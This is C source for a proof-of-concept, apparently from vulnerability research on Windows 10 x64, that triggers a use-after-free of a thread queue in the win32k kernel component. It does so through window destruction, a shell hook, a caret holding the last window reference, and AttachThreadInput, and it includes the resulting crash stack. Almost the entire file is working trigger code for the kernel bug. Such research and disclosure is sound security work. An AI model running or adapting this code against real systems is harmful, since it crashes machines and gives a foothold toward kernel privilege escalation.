//
// Gil Dabah 2019
//
// Win32k Smash the Ref - POC #8 - zzzAttachThreadInput PQ UAF
// Windows 10 x64
//

/*
Based on POC #3 for caret reloading and PQ UAFing
(this time instead of abusing PQ inside xxxCreateCaret, we do it through AttachThreadInput).

 We create a caret for a window, while the window is being destroyed.
 Then the w32thread->pq->caretwnd holds a last ref to the window.
 Once it's unlocked inside zzzDestroyQueue, it will do another attach-thread-queue which releases the PQ.
 Later on a PQ UAF will occur from the call to AttachThreadInput.

Crash stack:
nt!KiPageFault+0x42e
win32kfull!CheckTransferState+0xa
win32kfull!zzzAttachToQueue+0x32
win32kfull!zzzReattachThreads+0x17f
win32kfull!zzzAttachThreadInput+0x23e
win32kfull!NtUserAttachThreadInput+0xaf
*/

#include <windows.h>
#include <stdio.h>

HWND g_hWnd1 = NULL; // This is the target zombie window.
HWND g_hWnd2 = NULL; // hWnd2 is the owner of hWnd1 from another thread.
// All thread ID's, required for AttachThreadInput.
HHOOK g_hShellHook = NULL;

DWORD CALLBACK threadproc2(LPVOID)
{
	// Create owner window.
	g_hWnd2 = CreateWindow("ScrollBar", NULL, 0, 0, 0, 0, 0, NULL, NULL, NULL, NULL);
	Sleep(1000000);

	return 0;
}

LRESULT CALLBACK shellHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode == HSHELL_WINDOWDESTROYED)
	{
		static int once = 1;
		if (once)
		{
			once = 0;
			UnhookWindowsHookEx(g_hShellHook);

			printf("Step #2\n");
			// Destroy window.
			DestroyWindow(g_hWnd1);

			// Goes back to main's SetWindowLongPtr.
		}
	}
	return 0;
}

LRESULT CALLBACK wndproc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	// This message is sent from DestroyWindow from the shell hook proc.
	if (msg == WM_NCDESTROY)
	{
		printf("Step #3\n");
		printf("Creating caret from WM_NCDESTROY.\n");

		// Window is going to be zombie because this caret is created post its cleanup phase inside xxxDestroyWindow.
		// In fact, this caret will hold the last reference on this zombie, once we're back from SetWindowLongPtr in main.
		CreateCaret(hWnd, (HBITMAP)1, 1, 1);

		// Goes back to shellHookProc.
	}

	return DefWindowProc(hWnd, msg, wParam, lParam);
}

int main()
{
	// Create dummy window.
	HWND hWnd0 = CreateWindow("ScrollBar", NULL, 0, 0, 0, 0, 0, NULL, NULL, NULL, NULL);

	// Owner window thread
	DWORD thread2Tid = 0;
	CreateThread(NULL, 0, threadproc2, NULL, 0, &thread2Tid);
	// Wait for window to be created from other thread.
	while (g_hWnd2 == NULL) Sleep(10);

	WNDCLASS wc = { 0 };
	wc.lpfnWndProc = wndproc;
	wc.lpszClassName = "blaclass";
	RegisterClass(&wc);
	g_hWnd1 = CreateWindow(wc.lpszClassName, NULL, WS_OVERLAPPEDWINDOW, 0, 0, 0, 0, NULL, NULL, NULL, NULL);
	ShowWindow(g_hWnd1, SW_SHOW);
	SetActiveWindow(g_hWnd1);

	printf("Step #1\n");

	// Set owner window to a window that belongs to a different thread.
	// Do zombie reloading inside xxxHandleOwnerSwitch.
	// Note that xxxHandleOwnerSwitch also calls zzzAttachThreadInput to fix intended behavior with owner window of another thread.
	g_hShellHook = SetWindowsHookEx(WH_SHELL, shellHookProc, NULL, GetCurrentThreadId());
	// That side effect stays even though the window is destroyed as the detachment happened already *before* we set it, therefore we don't have to re-do it.
	// In other words, You can assume a call to AttachThreadInput(currentThread, thread2, TRUE) is called inside the next call.
	SetWindowLongPtr(g_hWnd1, GWLP_HWNDPARENT, (LONG_PTR)g_hWnd2);

	// At this point:
	// 1) we know that current thread is sharing a queue with thread 2 of the owner window.
	// 2) we got a zombie window held by a last reference of a caret. The caret is a resource of a thread-queue.
	// Only when the thread-queue is gone, it will let go of the zombie window too.

	printf("Step #4\n");

	// Trigger UAF!
	AttachThreadInput(GetCurrentThreadId(), thread2Tid, TRUE);

	return 0;
}
